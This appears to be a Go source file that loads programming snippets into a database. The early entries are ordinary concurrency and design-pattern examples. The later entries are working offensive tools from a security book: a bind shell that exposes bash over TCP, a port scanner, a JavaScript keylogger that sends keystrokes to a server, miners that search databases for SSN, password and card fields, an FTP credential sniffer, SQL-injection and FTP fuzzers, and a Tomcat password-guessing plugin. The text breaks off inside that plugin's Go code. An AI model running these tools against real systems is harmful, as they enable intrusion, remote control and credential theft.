	create(db, "Idiom functional options in constructor\n(tags: idiom functional options constructor)\n---\n\nhttps://github.com/tmrts/go-patterns\n\nFunctional options are a method of implementing clean/eloquent APIs in Go. Options implemented as a function set the state of that option.\n\ntype Options struct {\n  UID         int\n  GID         int\n  Flags       int\n  Contents    string\n  Permissions os.FileMode\n}\n\ntype Option func(*Options)\n\nfunc UID(userID int) Option {\n  return func(args *Options) {\n    args.UID = userID\n  }\n}\nfunc GID(groupID int) Option {\n  return func(args *Options) {\n    args.GID = groupID\n  }\n}\nfunc Contents(c string) Option {\n  return func(args *Options) {\n    args.Contents = c\n  }\n}\nfunc Permissions(perms os.FileMode) Option {\n  return func(args *Options) {\n    args.Permissions = perms\n  }\n}\n\nfunc New(filepath string, setters ...Option) error {\n  // Default Options\n  args := &Options{\n    UID:         os.Getuid(),\n    GID:         os.Getgid(),\n    Contents:    \"\",\n    Permissions: 0644,\n    Flags:       os.O_CREATE | os.O_EXCL | os.O_WRONLY,\n  }\n  for _, setter := range setters {\n    setter(args)\n  }\n  f, err := os.OpenFile(filepath, args.Flags, args.Permissions)\n  if err != nil {\n    return err\n  } else {\n    defer f.Close()\n  }\n  if _, err := f.WriteString(args.Contents); err != nil {\n    return err\n  }\n  return f.Chown(args.UID, args.GID)\n}\n\nfunc main() {\n  New(\"empty.txt\")\n  New(\"file.txt\", UID(1000), Contents(\"Lorem Ipsum Dolor Amet\"))\n}")
	create(db, "Pattern FanIn\n(tags: pattern fanin merge)\n---\n\nhttps://github.com/tmrts/go-patterns\n\nFan-In is a messaging pattern used to create a funnel for work amongst workers (clients: source, server: destination).\n\nWe can model fan-in using the Go channels.\n\npackage main\n\nimport (\n  \"fmt\"\n  \"sync\"\n  \"time\"\n)\n\n// Merge different channels in one channel\nfunc Merge(cs ...<-chan int) <-chan int {\n  var wg sync.WaitGroup\n  out := make(chan int)\n  // Start an send goroutine for each input channel in cs. send\n  // copies values from c to out until c is closed, then calls wg.Done.\n  send := func(c <-chan int) {\n    for n := range c {\n      out <- n\n    }\n    wg.Done()\n  }\n  wg.Add(len(cs))\n  for _, c := range cs {\n    go send(c)\n  }\n  // Start a goroutine to close out once all the send goroutines are\n  // done.  This must start after the wg.Add call.\n  go func() {\n    wg.Wait()\n    close(out)\n  }()\n  return out\n}\n\nfunc main() {\n  ch1 := make(chan int, 3)\n  ch2 := make(chan int, 3)\n  go func() {\n    for i := 0; i < 3; i++ {\n      ch1 <- i\n    }\n  }()\n  go func() {\n    for i := 0; i < 3; i++ {\n      ch2 <- i\n    }\n  }()\n  ch3 := Merge(ch1, ch2)\n\n  // without goroutine there will be deadlock!\n  \n  //go func() {\n  //  for val := range ch3 {\n  //    fmt.Println(val)\n  //  }\n  //}()\n\n  go func() {\n    for {\n      select {\n      case val := <- ch3:\n        fmt.Println(val)\n      }\n    }\n  }()\n  time.Sleep(time.Second)\n}")
	create(db, "Pattern FanOut\n(tags: pattern fanout split)\n---\n\nhttps://github.com/tmrts/go-patterns\n\nFan-Out is a messaging pattern used for distributing work amongst workers (producer: source, consumers: destination).\n\nWe can model fan-out using the Go channels.\n\npackage main\n\nimport (\n  \"fmt\"\n  \"time\"\n)\n\n// Split a channel into n channels that receive messages in a round-robin fashion.\nfunc Split(ch <-chan int, n int) []chan int {\n  cs := make([]chan int, 0, n)\n  for i := 0; i < n; i++ {\n    cs = append(cs, make(chan int))\n  }\n  // Distributes the work in a round robin fashion among the stated number\n  // of channels until the main channel has been closed. In that case, close\n  // all channels and return.\n  distributeToChannels := func(ch <-chan int, cs []chan int) {\n    // Close every channel when the execution ends.\n    //defer func(cs []chan int) {\n    //  for _, c := range cs {\n    //    close(c)\n    //  }\n    //}(cs)\n    for {\n      for _, c := range cs {\n        select {\n        case val, ok := <-ch:\n          if !ok {\n            return\n          }\n\n          c <- val\n        }\n      }\n    }\n  }\n\n  go distributeToChannels(ch, cs)\n\n  return cs\n}\n\nfunc main() {\n  ch1 := make(chan int, 6)\n  go func() {\n    for i := 0; i < 6; i++ {\n      ch1 <- i\n    }\n  }()\n  chs := Split(ch1, 2)\n\n  go func() {\n    for {\n      select {\n      case val := <-chs[0]:\n        fmt.Println(val)\n      case val := <-chs[1]:\n        fmt.Println(val)\n      default:\n      }\n    }\n  }()\n  time.Sleep(time.Second)\n}")
	create(db, "Pattern Circuit breaker\n(tags: pattern circuit breaker)\n---\n\nhttps://github.com/tmrts/go-patterns\n\nSimilar to electrical fuses that prevent fires when a circuit that is connected to the electrical grid starts drawing a high amount of power which causes the wires to heat up and combust, the circuit breaker design pattern is a fail-first mechanism that shuts down the circuit, request/response relationship or a service in the case of software development, to prevent bigger failures.\n\ncircuit.Counter is a simple counter that records success and failure states of a circuit along with a timestamp and calculates the consecutive number of failures.\n\nCircuit is wrapped using the circuit.Breaker closure that keeps an internal operation counter. It returns a fast error if the circuit has failed consecutively more than the specified threshold. After a while it retries the request and records it.\n\nNote: Context type is used here to carry deadlines, cancelation signals, and other request-scoped values across API boundaries and between processes.\n\npackage main\n\nimport (\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n\n  \"github.com/sony/gobreaker\"\n)\n\n// Get wraps http.Get in CircuitBreaker.\nfunc Get(cb *gobreaker.CircuitBreaker, url string) ([]byte, error) {\n  body, err := cb.Execute(func() (interface{}, error) {\n    resp, err := http.Get(url)\n    if err != nil {\n      return nil, err\n    }\n    defer resp.Body.Close()\n    body, err := ioutil.ReadAll(resp.Body)\n    if err != nil {\n      return nil, err\n    }\n    return body, nil\n  })\n  if err != nil {\n    return nil, err\n  }\n  return body.([]byte), nil\n}\n\nfunc main() {\n  var st gobreaker.Settings\n  st.Name = \"HTTP GET\"\n  st.ReadyToTrip = func(counts gobreaker.Counts) bool {\n    failureRatio := float64(counts.TotalFailures) / float64(counts.Requests)\n    return counts.Requests >= 3 && failureRatio >= 0.6\n  }\n  cb := gobreaker.NewCircuitBreaker(st)\n  \n  body, err := Get(cb, \"http://www.google.com/robots.txt\")\n  if err != nil {\n    log.Fatal(err)\n  }\n\n  fmt.Println(string(body))\n}")
	create(db, "Pattern Semaphore\n(tags: pattern semaphore)\n---\n\nhttps://github.com/tmrts\n\nA semaphore is a synchronization pattern/primitive that imposes mutual exclusion on a limited number of resources.\n\npackage main\n\nimport (\n  \"errors\"\n  \"fmt\"\n  \"time\"\n)\n\nvar (\n  ErrNoTickets      = errors.New(\"semaphore: could not aquire semaphore\")\n  ErrIllegalRelease = errors.New(\"semaphore: can't release the semaphore without acquiring it first\")\n)\n\n// Interface contains the behavior of a semaphore that can be acquired and/or released.\ntype Interface interface {\n  Acquire() error\n  Release() error\n}\n\ntype implementation struct {\n  sem     chan struct{}\n  timeout time.Duration\n}\n\nfunc (s *implementation) Acquire() error {\n  select {\n  case s.sem <- struct{}{}:\n    return nil\n  case <-time.After(s.timeout):\n    return ErrNoTickets\n  }\n}\n\nfunc (s *implementation) Release() error {\n  select {\n  case _ = <-s.sem:\n    return nil\n  case <-time.After(s.timeout):\n    return ErrIllegalRelease\n  }\n  return nil\n}\n\nfunc New(tickets int, timeout time.Duration) Interface {\n  return &implementation{\n    sem:     make(chan struct{}, tickets),\n    timeout: timeout,\n  }\n}\n\nfunc main() {\n  // if tickets = 1 and timeout < 3*time.Second there will be a panic \"semaphore: could not aquire semaphore\"\n  tickets, timeout := 3, time.Second\n  s := New(tickets, timeout)\n  for i := 0; i < 3; i++{\n    go func(i int) {\n      if err := s.Acquire(); err != nil {\n        panic(err)\n      }\n      time.Sleep(1 * time.Second)\n      fmt.Println(\"work\", i)\n      if err := s.Release(); err != nil {\n        panic(err)\n      }\n    }(i)\n  }\n  time.Sleep(4 * time.Second)\n}")
	create(db, "Create file with svg image\n(tags: file svg image)\n---\n\npackage main\n\nimport \"github.com/ajstarks/svgo\"\n\nfunc main() {\n  f, err := os.Create(\"1.svg\") \n  canvas := svg.New(io.Writer(f))\n  canvas.Start(800, 600)\n  txtOpt := \"text-anchor:left;font-family:monospace;font-size:16px;fill:black\"\n  lineOpt := \"fill:none;stroke-width:2px;stroke:rgb(0,255,0)\"\n  rectOpt := \"fill:white;stroke-width:6px;stroke:rgb(0,255,255)\"\n  p.canvas.Roundrect(10, 10, 100, 30, 10, 10, rectOpt)\n  p.canvas.Text(50, 50, \"some text\", txtOpt)\n  p.canvas.Qbez(10, 20, 30, 40, 50, 60, lineOpt)\n  p.canvas.End()\n}")
	create(db, "Server with svg image in response\n(tags: server svg image)\n---\n\npackage main\n\nimport \"github.com/ajstarks/svgo\"\n\nfunc main() {\n  http.Handle(\"/circle\", http.HandlerFunc(circle))\n  err := http.ListenAndServe(\":2003\", nil)\n}\n\nfunc circle(w http.ResponseWriter, req *http.Request) {\n  w.Header().Set(\"Content-Type\", \"image/svg+xml\")\n  s := svg.New(w)\n  s.Start(500, 500)\n  s.Circle(250, 250, 125, \"fill:none;stroke:black\")\n  s.End()\n}")
	create(db, "Reader and writer std in and out\n(tags: reader writer std in out)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"fmt\"\n  \"io\"\n  \"log\"\n  \"os\"\n)\n\n// FooReader defines an io.Reader to read from stdin.\ntype FooReader struct{}\n\n// Read reads data from stdin.\nfunc (fooReader *FooReader) Read(b []byte) (int, error) {\n  fmt.Print(\"in > \")\n  return os.Stdin.Read(b)\n}\n\n// FooWriter defines an io.Writer to write to Stdout.\ntype FooWriter struct{}\n\n// Write writes data to Stdout.\nfunc (fooWriter *FooWriter) Write(b []byte) (int, error) {\n  fmt.Print(\"out> \")\n  return os.Stdout.Write(b)\n}\n\nfunc main() {\n  // Instantiate reader and writer.\n  var (\n    reader FooReader\n    writer FooWriter\n  )\n\n  if _, err := io.Copy(&writer, &reader); err != nil {\n    log.Fatalln(\"Unable to read/write data\")\n  }\n}")
	create(db, "Tcp echo server\n(tags: tcp server)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"io\"\n  \"log\"\n  \"net\"\n)\n\n// echo is a handler function that simply echoes received data.\nfunc echo(conn net.Conn) {\n  defer conn.Close()\n\n  // Create a buffer to store received data.\n  b := make([]byte, 512)\n  for {\n    // Receive data via conn.Read into a buffer.\n    size, err := conn.Read(b[0:])\n    if err == io.EOF {\n      log.Println(\"Client disconnected\")\n      break\n    }\n    if err != nil {\n      log.Println(\"Unexpected error\")\n      break\n    }\n    log.Printf(\"Received %d bytes: %s\", size, string(b))\n\n    // Send data via conn.Write.\n    log.Println(\"Writing data\")\n    if _, err := conn.Write(b[0:size]); err != nil {\n      log.Fatalln(\"Unable to write data\")\n    }\n  }\n}\n\nfunc main() {\n  // Bind to TCP port 20080 on all interfaces.\n  listener, err := net.Listen(\"tcp\", \":20080\")\n  if err != nil {\n    log.Fatalln(\"Unable to bind to port\")\n  }\n  log.Println(\"Listening on 0.0.0.0:20080\")\n  for {\n    // Wait for connection. Create net.Conn on connection established.\n    conn, err := listener.Accept()\n    log.Println(\"Received connection\")\n    if err != nil {\n      log.Fatalln(\"Unable to accept connection\")\n    }\n    // Handle the connection. Using goroutine for concurrency.\n    go echo(conn)\n  }\n}")
	create(db, "Remote shell\n(tags: tcp shell remote std in out exec)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"io\"\n  \"log\"\n  \"net\"\n  \"os/exec\"\n)\n\nfunc handle(conn net.Conn) {\n  /*\n   * Explicitly calling /bin/sh and using -i for interactive mode\n   * so that we can use it for stdin and stdout.\n   * For Windows use exec.Command(\"cmd.exe\")\n   */\n  //cmd := exec.Command(\"cmd.exe\")\n  //cmd := exec.Command(\"/bin/sh\", \"-i\")\n  cmd := exec.Command(\"/bin/bash\", \"-i\")\n  //cmd := exec.Command(\"pwd\")\n  rp, wp := io.Pipe()\n  // Set stdin to our connection\n  cmd.Stdin = conn\n  cmd.Stdout = wp\n  cmd.Stderr = wp\n  go io.Copy(conn, rp)\n  cmd.Run()\n  conn.Close()\n}\n\nfunc main() {\n  listener, err := net.Listen(\"tcp\", \":20080\")\n  if err != nil {\n    log.Fatalln(err)\n  }\n  for {\n    conn, err := listener.Accept()\n    if err != nil {\n      log.Fatalln(err)\n    }\n    go handle(conn)\n  }\n}")
	create(db, "Port scanner\n(tags: port scanner)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"fmt\"\n  \"net\"\n  \"sort\"\n)\n\nfunc worker(ports, results chan int) {\n  for p := range ports {\n    address := fmt.Sprintf(\"scanme.nmap.org:%d\", p)\n    conn, err := net.Dial(\"tcp\", address)\n    if err != nil {\n      results <- 0\n      continue\n    }\n    conn.Close()\n    results <- p\n  }\n}\n\nfunc main() {\n  ports := make(chan int, 100)\n  results := make(chan int)\n  var openports []int\n\n  for i := 0; i < cap(ports); i++ {\n    go worker(ports, results)\n  }\n\n  go func() {\n    for i := 1; i <= 1024; i++ {\n      ports <- i\n    }\n  }()\n\n  for i := 0; i < 1024; i++ {\n    port := <-results\n    if port != 0 {\n      openports = append(openports, port)\n    }\n  }\n\n  close(ports)\n  close(results)\n  sort.Ints(openports)\n  for _, port := range openports {\n    fmt.Printf(\"%d open\\n\", port)\n  }\n}")
	create(db, "Websocket keylogger\n(tags: websocket keylogger)\n---\n\nhttps://github.com/blackhat-go\n\n1. For example use a site jsbin.com\n2. Insert there\n\n<!DOCTYPE html>\n<html>\n<head><title>Login</title></head>\n<body>\n<script src='http://localhost:8080/k.js'></script>\n<form action='/login' method='post'><input name='username'/> <input name='password'/> <input type=\"submit\"/></form>\n</body>\n</html>\n\n3. In main.go write\n\npackage main\n\nimport (\n  \"flag\"\n  \"fmt\"\n  \"html/template\"\n  \"log\"\n  \"net/http\"\n\n  \"github.com/gorilla/mux\"\n  \"github.com/gorilla/websocket\"\n)\n\nvar (\n  upgrader = websocket.Upgrader{\n    CheckOrigin: func(r *http.Request) bool { return true },\n  }\n\n  listenAddr string\n  wsAddr     string\n  jsTemplate *template.Template\n)\n\nfunc init() {\n  flag.StringVar(&listenAddr, \"listen-addr\", \"\", \"Address to listen on\")\n  flag.StringVar(&wsAddr, \"ws-addr\", \"\", \"Address for WebSocket connection\")\n  flag.Parse()\n  var err error\n  jsTemplate, err = template.ParseFiles(\"logger.js\")\n  if err != nil {\n    panic(err)\n  }\n}\n\nfunc serveWS(w http.ResponseWriter, r *http.Request) {\n  conn, err := upgrader.Upgrade(w, r, nil)\n  if err != nil {\n    http.Error(w, \"\", 500)\n    return\n  }\n  defer conn.Close()\n  fmt.Printf(\"Connection from %s\\n\", conn.RemoteAddr().String())\n  for {\n    _, msg, err := conn.ReadMessage()\n    if err != nil {\n      return\n    }\n    fmt.Printf(\"From %s: %s\\n\", conn.RemoteAddr().String(), string(msg))\n  }\n}\n\nfunc serveFile(w http.ResponseWriter, r *http.Request) {\n  w.Header().Set(\"Content-Type\", \"application/javascript\")\n  jsTemplate.Execute(w, wsAddr)\n}\n\nfunc main() {\n  r := mux.NewRouter()\n  r.HandleFunc(\"/ws\", serveWS)\n  r.HandleFunc(\"/k.js\", serveFile)\n  log.Fatal(http.ListenAndServe(\":8080\", r))\n}\n\n4. In logger.js write\n\n(function() {\n    var conn = new WebSocket(\"ws://{{.}}/ws\");\n    document.onkeypress = keypress;\n    function keypress(evt) {\n        s = String.fromCharCode(evt.which);\n        conn.send(s);\n    }\n})();\n\n// example of output in serever if someone tapping on the site\nFrom 127.0.0.1:41488: d\nFrom 127.0.0.1:41488: f\nFrom 127.0.0.1:41488: g")
	create(db, "Database miner for mongo\n(tags: db miner mongo schema)\n---\n\nhttps://github.com/blackhat-go\n\n// dbminer.go\npackage main\n\nimport (\n  \"fmt\"\n  \"regexp\"\n)\n\ntype DatabaseMiner interface {\n  GetSchema() (*Schema, error)\n}\n\ntype Schema struct {\n  Databases []Database\n}\n\ntype Database struct {\n  Name   string\n  Tables []Table\n}\n\ntype Table struct {\n  Name    string\n  Columns []string\n}\n\nfunc Search(m DatabaseMiner) error {\n  s, err := m.GetSchema()\n  if err != nil {\n    return err\n  }\n  re := getRegex()\n  for _, database := range s.Databases {\n    for _, table := range database.Tables {\n      for _, field := range table.Columns {\n        for _, r := range re {\n          if r.MatchString(field) {\n            fmt.Println(database)\n            fmt.Printf(\"[+] HIT: %s\\n\", field)\n          }\n        }\n      }\n    }\n  }\n  return nil\n}\n\nfunc getRegex() []*regexp.Regexp {\n  return []*regexp.Regexp{\n    regexp.MustCompile(`(?i)social`),\n    regexp.MustCompile(`(?i)ssn`),\n    regexp.MustCompile(`(?i)pass(word)?`),\n    regexp.MustCompile(`(?i)hash`),\n    regexp.MustCompile(`(?i)ccnum`),\n    regexp.MustCompile(`(?i)card`),\n    regexp.MustCompile(`(?i)security`),\n    regexp.MustCompile(`(?i)key`),\n  }\n}\n\nfunc (s Schema) String() string {\n  var ret string\n  for _, database := range s.Databases {\n    ret += fmt.Sprint(database.String() + \"\\n\")\n  }\n  return ret\n}\n\nfunc (d Database) String() string {\n  ret := fmt.Sprintf(\"[DB] = %+s\\n\", d.Name)\n  for _, table := range d.Tables {\n    ret += table.String()\n  }\n  return ret\n}\n\nfunc (t Table) String() string {\n  ret := fmt.Sprintf(\"    [TABLE] = %+s\\n\", t.Name)\n  for _, field := range t.Columns {\n    ret += fmt.Sprintf(\"       [COL] = %+s\\n\", field)\n  }\n  return ret\n}\n\n// main.go\npackage main\n\nimport (\n  \"os\"\n  \"gopkg.in/mgo.v2\"\n  \"gopkg.in/mgo.v2/bson\"\n)\n\ntype MongoMiner struct {\n  Host    string\n  session *mgo.Session\n}\n\nfunc New(host string) (*MongoMiner, error) {\n  m := MongoMiner{Host: host}\n  err := m.connect()\n  if err != nil {\n    return nil, err\n  }\n  return &m, nil\n}\n\nfunc (m *MongoMiner) connect() error {\n  s, err := mgo.Dial(m.Host)\n  if err != nil {\n    return err\n  }\n  m.session = s\n  return nil\n}\n\nfunc (m *MongoMiner) GetSchema() (*dbminer.Schema, error) {\n  var s = new(dbminer.Schema)\n\n  dbnames, err := m.session.DatabaseNames()\n  if err != nil {\n    return nil, err\n  }\n\n  for _, dbname := range dbnames {\n    db := dbminer.Database{Name: dbname, Tables: []dbminer.Table{}}\n    collections, err := m.session.DB(dbname).CollectionNames()\n    if err != nil {\n      return nil, err\n    }\n\n    for _, collection := range collections {\n      table := dbminer.Table{Name: collection, Columns: []string{}}\n\n      var docRaw bson.Raw\n      err := m.session.DB(dbname).C(collection).Find(nil).One(&docRaw)\n      if err != nil {\n        return nil, err\n      }\n\n      var doc bson.RawD\n      if err := docRaw.Unmarshal(&doc); err != nil {\n        if err != nil {\n          return nil, err\n        }\n      }\n\n      for _, f := range doc {\n        table.Columns = append(table.Columns, f.Name)\n      }\n      db.Tables = append(db.Tables, table)\n    }\n    s.Databases = append(s.Databases, db)\n  }\n  return s, nil\n}\n\nfunc main() {\n  mm, err := New(os.Args[1])\n  if err != nil {\n    panic(err)\n  }\n  if err := Search(mm); err != nil {\n    panic(err)\n  }\n}")
	create(db, "Database miner for mysql\n(tags: db miner mysql schema)\n---\n\nhttps://github.com/blackhat-go\n\n// dbminer.go\npackage main\n\nimport (\n  \"fmt\"\n  \"regexp\"\n)\n\ntype DatabaseMiner interface {\n  GetSchema() (*Schema, error)\n}\n\ntype Schema struct {\n  Databases []Database\n}\n\ntype Database struct {\n  Name   string\n  Tables []Table\n}\n\ntype Table struct {\n  Name    string\n  Columns []string\n}\n\nfunc Search(m DatabaseMiner) error {\n  s, err := m.GetSchema()\n  if err != nil {\n    return err\n  }\n  re := getRegex()\n  for _, database := range s.Databases {\n    for _, table := range database.Tables {\n      for _, field := range table.Columns {\n        for _, r := range re {\n          if r.MatchString(field) {\n            fmt.Println(database)\n            fmt.Printf(\"[+] HIT: %s\\n\", field)\n          }\n        }\n      }\n    }\n  }\n  return nil\n}\n\nfunc getRegex() []*regexp.Regexp {\n  return []*regexp.Regexp{\n    regexp.MustCompile(`(?i)social`),\n    regexp.MustCompile(`(?i)ssn`),\n    regexp.MustCompile(`(?i)pass(word)?`),\n    regexp.MustCompile(`(?i)hash`),\n    regexp.MustCompile(`(?i)ccnum`),\n    regexp.MustCompile(`(?i)card`),\n    regexp.MustCompile(`(?i)security`),\n    regexp.MustCompile(`(?i)key`),\n  }\n}\n\nfunc (s Schema) String() string {\n  var ret string\n  for _, database := range s.Databases {\n    ret += fmt.Sprint(database.String() + \"\\n\")\n  }\n  return ret\n}\n\nfunc (d Database) String() string {\n  ret := fmt.Sprintf(\"[DB] = %+s\\n\", d.Name)\n  for _, table := range d.Tables {\n    ret += table.String()\n  }\n  return ret\n}\n\nfunc (t Table) String() string {\n  ret := fmt.Sprintf(\"    [TABLE] = %+s\\n\", t.Name)\n  for _, field := range t.Columns {\n    ret += fmt.Sprintf(\"       [COL] = %+s\\n\", field)\n  }\n  return ret\n}\n\n// main.go\npackage main\n\nimport (\n  \"database/sql\"\n  \"fmt\"\n  \"log\"\n  \"os\"\n\n  _ \"github.com/go-sql-driver/mysql\"\n  \"github.com/blackhat-go/bhg/ch-7/db/dbminer\"\n)\n\ntype MySQLMiner struct {\n  Host string\n  Db   sql.DB\n}\n\nfunc New(host string) (*MySQLMiner, error) {\n  m := MySQLMiner{Host: host}\n  err := m.connect()\n  if err != nil {\n    return nil, err\n  }\n  return &m, nil\n}\n\nfunc (m *MySQLMiner) connect() error {\n\n  db, err := sql.Open(\"mysql\", fmt.Sprintf(\"root:password@tcp(%s:3306)/information_schema\", m.Host))\n  if err != nil {\n    log.Panicln(err)\n  }\n  m.Db = *db\n  return nil\n}\n\nfunc (m *MySQLMiner) GetSchema() (*dbminer.Schema, error) {\n  var s = new(dbminer.Schema)\n\n  sql := `SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns\n  WHERE TABLE_SCHEMA NOT IN ('mysql', 'information_schema', 'performance_schema', 'sys')\n  ORDER BY TABLE_SCHEMA, TABLE_NAME`\n  schemarows, err := m.Db.Query(sql)\n  if err != nil {\n    return nil, err\n  }\n  defer schemarows.Close()\n\n  var prevschema, prevtable string\n  var db dbminer.Database\n  var table dbminer.Table\n  for schemarows.Next() {\n    var currschema, currtable, currcol string\n    if err := schemarows.Scan(&currschema, &currtable, &currcol); err != nil {\n      return nil, err\n    }\n\n    if currschema != prevschema {\n      if prevschema != \"\" {\n        db.Tables = append(db.Tables, table)\n        s.Databases = append(s.Databases, db)\n      }\n      db = dbminer.Database{Name: currschema, Tables: []dbminer.Table{}}\n      prevschema = currschema\n      prevtable = \"\"\n    }\n\n    if currtable != prevtable {\n      if prevtable != \"\" {\n        db.Tables = append(db.Tables, table)\n      }\n      table = dbminer.Table{Name: currtable, Columns: []string{}}\n      prevtable = currtable\n    }\n    table.Columns = append(table.Columns, currcol)\n  }\n  db.Tables = append(db.Tables, table)\n  s.Databases = append(s.Databases, db)\n  if err := schemarows.Err(); err != nil {\n    return nil, err\n  }\n\n  return s, nil\n}\n\nfunc main() {\n  mm, err := New(os.Args[1])\n  if err != nil {\n    panic(err)\n  }\n  defer mm.Db.Close()\n  if err := dbminer.Search(mm); err != nil {\n    panic(err)\n  }\n}")
	create(db, "Using pcap for finding all devices\n(tags: pcap device find)\n---\n\nhttps://github.com/blackhat-go\n\n// sudo apt install libpcap-dev\n\npackage main\n\nimport (\n  \"fmt\"\n  \"log\"\n  \"github.com/google/gopacket/pcap\"\n)\n\nfunc main() {\n  devices, err := pcap.FindAllDevs()\n  if err != nil {\n    log.Panicln(err)\n  }\n\n  for _, device := range devices {\n    fmt.Println(device.Name)\n    for _, address := range device.Addresses {\n      fmt.Printf(\"    IP:      %s\\n\", address.IP)\n      fmt.Printf(\"    Netmask: %s\\n\", address.Netmask)\n    }\n  }\n}")
	create(db, "Capturing packets and filter them\n(tags: pcap packet filter)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"fmt\"\n  \"log\"\n  \"github.com/google/gopacket\"\n  \"github.com/google/gopacket/pcap\"\n)\n\nvar (\n  iface    = \"enp0s5\"\n  snaplen  = int32(1600)\n  promisc  = false\n  timeout  = pcap.BlockForever\n  filter   = \"tcp and port 80\"\n  devFound = false\n)\n\nfunc main() {\n  devices, err := pcap.FindAllDevs()\n  if err != nil {\n    log.Panicln(err)\n  }\n\n  for _, device := range devices {\n    if device.Name == iface {\n      devFound = true\n    }\n  }\n  if !devFound {\n    log.Panicf(\"Device named '%s' does not exist\\n\", iface)\n  }\n\n  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)\n  if err != nil {\n    log.Panicln(err)\n  }\n  defer handle.Close()\n\n  if err := handle.SetBPFFilter(filter); err != nil {\n    log.Panicln(err)\n  }\n\n  source := gopacket.NewPacketSource(handle, handle.LinkType())\n  for packet := range source.Packets() {\n    fmt.Println(packet)\n  }\n}")
	create(db, "Ispect payload from ftp packets using pcap\n(tags: pcap packet ftp payload)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"bytes\"\n  \"fmt\"\n  \"log\"\n  \"github.com/google/gopacket\"\n  \"github.com/google/gopacket/pcap\"\n)\n\nvar (\n  iface    = \"enp0s5\"\n  snaplen  = int32(1600)\n  promisc  = false\n  timeout  = pcap.BlockForever\n  filter   = \"tcp and dst port 21\"\n  devFound = false\n)\n\nfunc main() {\n  devices, err := pcap.FindAllDevs()\n  if err != nil {\n    log.Panicln(err)\n  }\n\n  for _, device := range devices {\n    if device.Name == iface {\n      devFound = true\n    }\n  }\n  if !devFound {\n    log.Panicf(\"Device named '%s' does not exist\\n\", iface)\n  }\n\n  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)\n  if err != nil {\n    log.Panicln(err)\n  }\n  defer handle.Close()\n\n  if err := handle.SetBPFFilter(filter); err != nil {\n    log.Panicln(err)\n  }\n\n  source := gopacket.NewPacketSource(handle, handle.LinkType())\n  for packet := range source.Packets() {\n    appLayer := packet.ApplicationLayer()\n    if appLayer == nil {\n      continue\n    }\n    payload := appLayer.Payload()\n    if bytes.Contains(payload, []byte(\"USER\")) {\n      fmt.Print(string(payload))\n    } else if bytes.Contains(payload, []byte(\"PASS\")) {\n      fmt.Print(string(payload))\n    }\n  }\n}")
	create(db, "Ftp fuzzer\n(tags: ftp fuzzer)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"bufio\"\n  \"fmt\"\n  \"log\"\n  \"net\"\n)\n\nfunc main() {\n  for i := 0; i < 2500; i++ {\n    conn, err := net.Dial(\"tcp\", \"10.0.1.20:21\")\n    if err != nil {\n      log.Fatalf(\"[!] Error at offset %d: %s\\n\", i, err)\n    }\n    bufio.NewReader(conn).ReadString('\\n')\n\n    user := \"\"\n    for n := 0; n <= i; n++ {\n      user += \"A\"\n    }\n\n    raw := \"USER %s\\n\"\n    fmt.Fprintf(conn, raw, user)\n    bufio.NewReader(conn).ReadString('\\n')\n\n    raw = \"PASS password\\n\"\n    fmt.Fprint(conn, raw)\n    bufio.NewReader(conn).ReadString('\\n')\n\n    if err := conn.Close(); err != nil {\n      log.Println(\"[!] Unable to close connection. Is service alive?\")\n    }\n  }\n}")
	create(db, "Http sql fuzzer\n(tags: http sql fuzzer)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"bytes\"\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n  \"regexp\"\n)\n\nfunc main() {\n  payloads := []string{\n    \"baseline\",\n    \")\",\n    \"(\",\n    \"\\\"\",\n    \"'\",\n  }\n\n  sqlErrors := []string{\n    \"SQL\",\n    \"MySQL\",\n    \"ORA-\",\n    \"syntax\",\n  }\n\n  errRegexes := []*regexp.Regexp{}\n  for _, e := range sqlErrors {\n    re := regexp.MustCompile(fmt.Sprintf(\".*%s.*\", e))\n    errRegexes = append(errRegexes, re)\n  }\n\n  for _, payload := range payloads {\n    client := new(http.Client)\n    body := []byte(fmt.Sprintf(\"username=%s&password=p\", payload))\n    req, err := http.NewRequest(\n      \"POST\",\n      \"http://10.0.1.20:8080/WebApplication/login.jsp?debug=true\",\n      bytes.NewReader(body),\n    )\n    if err != nil {\n      log.Fatalf(\"[!] Unable to generate request: %s\\n\", err)\n    }\n    req.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    resp, err := client.Do(req)\n    if err != nil {\n      log.Fatalf(\"[!] Unable to process response: %s\\n\", err)\n    }\n    body, err = ioutil.ReadAll(resp.Body)\n    if err != nil {\n      log.Fatalf(\"[!] Unable to read response body: %s\\n\", err)\n    }\n    resp.Body.Close()\n\n    for idx, re := range errRegexes {\n      if re.MatchString(string(body)) {\n        fmt.Printf(\n          \"[+] SQL Error found ('%s') for payload: %s\\n\",\n          sqlErrors[idx],\n          payload,\n        )\n        break\n      }\n    }\n  }\n}")
	create(db, "Plugin on lua for go\n(tags: plugin lua)\n---\n\nhttps://github.com/blackhat-go\n\n// plugins/tomcat.lua\nusernames = {\"admin\", \"manager\", \"tomcat\"}\npasswords = {\"admin\", \"manager\", \"tomcat\", \"password\"}\n\nstatus, basic, err = http.head(\"10.0.1.20\", 8080, \"/manager/html\")\nif err ~= \"\" then\n    print(\"[!] Error: \"..err)\n    return\nend\nif status ~= 401 or not basic then\n    print(\"[!] Error: Endpoint does not require Basic Auth. Exiting.\")\n    return\nend\nprint(\"[+] Endpoint requires Basic Auth. Proceeding with password guessing\")\nfor i, username in ipairs(usernames) do\n    for j, password in ipairs(passwords) do\n        status, basic, err = http.get(\"10.0.1.20\", 8080, username, password, \"/manager/html\")\n        if status == 200 then\n            print(\"[+] Found creds - \"..username..\":\"..password)\n            return\n        end\n    end\nend\n\n// cmd/scanner/main.go\npackage main\n\nimport (\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n 